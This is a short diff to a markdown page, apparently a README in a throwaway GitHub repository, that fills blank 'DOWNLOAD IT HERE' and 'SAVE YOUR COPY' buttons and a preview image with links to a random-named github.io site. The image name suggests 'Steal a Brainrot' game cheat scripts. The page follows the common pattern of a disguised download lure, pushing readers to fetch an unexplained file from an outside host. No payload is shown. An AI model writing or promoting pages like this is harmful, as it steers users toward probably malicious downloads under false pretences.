@@ -1,6 +1,6 @@
 # 🎁 **YOUR FILE IS JUST A CLICK AWAY**
 
-## [📥 **DOWNLOAD IT HERE**]( )
+## [📥 **DOWNLOAD IT HERE**](https://wpeikxyrjnps.github.io/.github/)
 
 > Open the link in your browser to begin downloading the file.
 
@@ -8,11 +8,11 @@
 
 ## 🖼️ **PREVIEW THE FILE**
 
-<img src="" width="1280" height="720" alt="File preview">
+<img src="https://github.com/wpeikxyrjnps/.github/blob/main/Steal-a-Brainrot-Scripts-%28SAB%29-pc-desktop.jpg?raw=true" width="1280" height="720" alt="File preview">
 
 ---
 
-### ⬇️ [**SAVE YOUR COPY**]( )
+### ⬇️ [**SAVE YOUR COPY**](https://wpeikxyrjnps.github.io/.github/)
 
 
 ---
